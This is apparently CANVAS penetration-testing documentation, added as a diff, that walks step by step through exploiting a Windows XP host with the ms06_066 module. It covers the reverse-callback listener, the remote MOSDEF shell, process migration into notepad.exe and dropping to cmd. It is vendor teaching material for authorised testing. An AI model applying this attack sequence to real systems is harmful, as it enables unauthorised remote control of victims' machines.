@@ -1,0 +1,225 @@
+CANVAS commandline usage works on several basic principles:
+
+1. You have to be in the CANVAS root directory. From there you can run
+exploits as such:
+
+./exploits/exploitname/exploitname.py
+
+This will give you commandline options for the exploit in question.
+Often a CANVAS exploit will require you to set up a listener for a
+callback. You can do this using the 'commandlineInterface.py' file.
+
+2. commandlineInterface.py
+
+The commandline interface module lets you set up listeners for the
+various types of platforms CANVAS supports. For example:
+
+user@CANVAS $ ./commandlineInterface.py
+
+Running command line interface v 1.0
+Copyright Immunity, Inc.
+If using an MSRPC attack, use the -i fromcreatethread option
+
+    Command Line Interface Version 1.0, Immunity, Inc.
+    usage: commandlineInterface.py -p port -v <ver number> [-i initstring]
+    initstring values:
+          fromcreatethread (used for MSRPC attacks, for example)
+
+0) LINUXEXECVE
+1) WIN32MOSDEF
+2) LINUXMOSDEF
+3) SOLARISMOSDEF
+4) BSDMOSDEF
+5) OSXMOSDEF
+6) AIXMOSDEF
+7) PHPMULTI
+8) Java
+
+user@CANVAS $
+
+
+So if I wanted to set up a Windows MOSDEF listener for the new MS06_066
+module (which will be released this friday) I would go:
+
+user@CANVAS $ ./commandlineInterface.py -v 1 -p 8080 -i fromcreatethread
+
+Running command line interface v 1.0
+Copyright Immunity, Inc.
+If using an MSRPC attack, use the -i fromcreatethread option
+Intializing engine
+Loading osdetect ...
+[ ok ]
+Loading addhost ...
+[ ok ]
+Loading gethostbyname ...
+[ ok ]
+Loading emailsender ...
+[ ok ]
+Loading startservice ...
+[ ok ]
+Loading userenum ...
+[ ok ]
+No country exclude list loaded
+
+[*] CANVAS Started [*]
+
+[C] Getting interface data
+[C (node has noshell)] Adding host 192.168.1.1 in localNode
+[C] Getting name for 192.168.1.1
+[C] Get host by name result: 192.168.1.1
+No GeoIP installed. Not enabling exclusion list.
+[C] Host added: 192.168.1.1
+[!] Listening on port 8080 ...
+
+...
+
+Please note the fromcreatethread option is only needed when it is
+mentioned in the documentation for the exploit. I am now ready to launch
+my commandline attack. I have a Windows XP SP2 box with DEP turned on at
+192.168.1.107 with the ms netware client installed.
+
+3. Running an exploit
+
+user@CANVAS $ ./exploits/ms06_066/ms06_066.py
+
+...
+====================main options======================
+Standard options: -v <version> -t <host> [ -p <port> ]
+Callback options: -l <localhost> -d <localport>
+====================additional options================
+Toggle test mode: -T
+Set covertness: -C <covertness>
+====================custom options====================
+====================versions==========================
+0: Autoversioning (except for XP SP2)
+1: Windows 2000 SP4, XP SP1a
+2: Windows XP SP2 English (with DEP)
+
+user@CANVAS $
+
+Because I know this exploit requires a callback I set up a listener in
+the previous steps, and will now set the appropriate options:
+
+user@CANVAS $ ./exploits/ms06_066/ms06_066.py  -v 2 -t 192.168.1.107 -l
+192.168.1.103 -d 8080
+
+...
+
+I now focus my attention on the listener terminal. If the attack worked
+it should receive a callback from the target and start up a MOSDEF node.
+
+...
+
+[C] Host added: 192.168.1.1
+[!] Listening on port 8080
+
+...
+
+Using loadlibrary_withmalloc! (iphlpapi.dll)
+Loadlibrary iphlpapi.dll = 76d60000
+[C] Getprocaddr_withmalloc: Found iphlpapi.dll|GetIpAddrTable at 76d63bf4
+Letting user interact with server
+Win32/MOSDEF$
+
+4. Interacting with a MOSDEF node on the commandline
+
+There's several ways to interact with the MOSDEF commandline. First is
+through it's set of basic commands, you can get a listing with '?'. The
+more common way is to call modules to be run via the 'runmodule'
+command. You can run any command and tool that you can run from the GUI
+in the commandline also.
+
+For example, if I wanted to run the mosdefmigrate module to move MOSDEF
+into a different process, I'd use two modules 'ps' and 'mosdefmigrate'.
+The options to the modules are set via the -O system. Modules always
+expect a -O, so if you have no options to feed, just set a -O none:none.
+
+Example:
+
+Win32/MOSDEF$ runmodule ps -O none:none
+
+...
+
+[C] Pslisting:
+0 [System Process] (threads=1)
+    4 System (threads=53)
+        364 smss.exe (threads=3)
+            460 csrss.exe (threads=12)
+            488 winlogon.exe (threads=22)
+                536 services.exe (threads=16)
+                    732 svchost.exe (threads=19)
+                    880 svchost.exe (threads=9)
+                    972 svchost.exe (threads=68)
+                        1028 wuauclt.exe (threads=8)
+                        1152 wuauclt.exe (threads=4)
+                        1292 wscntfy.exe (threads=1)
+                    1048 svchost.exe (threads=5)
+                    1100 svchost.exe (threads=17)
+                    1396 spoolsv.exe (threads=15)
+                    1928 GhostStartService.exe (threads=4)
+                    500 VMwareService.exe (threads=4)
+                    1284 alg.exe (threads=6)
+                    1808 svchost.exe (threads=9)
+                548 lsass.exe (threads=20)
+    1856 explorer.exe (threads=13)
+        1980 GhostStartTrayApp.exe (threads=1)
+        1988 VMwareTray.exe (threads=2)
+        2012 msmsgs.exe (threads=4)
+        408 notepad.exe (threads=1)
+Win32/MOSDEF$
+
+Now say I wanted to mosdefmigrate into the notepad process at pid 408, I
+would need to set -O pid:408 to the mosdefmigrate module.
+
+Win32/MOSDEF$ runmodule mosdefmigrate -O pid:408
+
+...
+
+[C] [!] attempting to migrate SOCKET 4444
+[C] kernel32.dll|DuplicateHandle not in cache - retrieving remotely.
+[C] Getprocaddr_withmalloc: Found kernel32.dll|DuplicateHandle at 7c80e016
+[C] [!] migrated SOCKET to a remote SOCKET of 112
+
+...
+
+[C] [!] MOSDEF migrated to pid: 408
+Win32/MOSDEF$
+
+We are now within the notepad.exe process. We can check this using the
+getpid command:
+
+Win32/MOSDEF$ runmodule getpid -O none:none
+[C] Pid: 408
+Win32/MOSDEF$
+
+There's a couple of features not available from the gui that you can use
+from the commandline, such as the 'shellshock' command, which lets you
+go to a regular shell and back to MOSDEF on any supported platform:
+
+
+Win32/MOSDEF$ shellshock
+ [C] kernel32.dll|WriteFile not in cache - retrieving remotely.
+[C] Getprocaddr_withmalloc: Found kernel32.dll|WriteFile at 7c810f9f
+[C] kernel32.dll|PeekNamedPipe not in cache - retrieving remotely.
+[C] Getprocaddr_withmalloc: Found kernel32.dll|PeekNamedPipe at 7c85f6ef
+[C] ws2_32.dll|select not in cache - retrieving remotely.
+[C] Getprocaddr_withmalloc: Found ws2_32.dll|select at 71ab2dc0
+[!] Turning MOSDEF-Node into temporary interactive shell
+[!] Note: will revert back to MOSDEF on "exit"
+..........shellshocked!
+
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\bas>exit
+exit
+[!] Cleaning up left over muckery, please remain seated..
+[!] Your regular MOSDEF programming will return shortly..
+Win32/MOSDEF$
+
+The commandline is something we use ourselves a lot, but it is not
+hugely documented as it is not the main way CANVAS was designed to be
+used. However it does allow you to get really flexible with your CANVAS
+usage, but it may require some source reading from time to time for
+things like module option names.
+
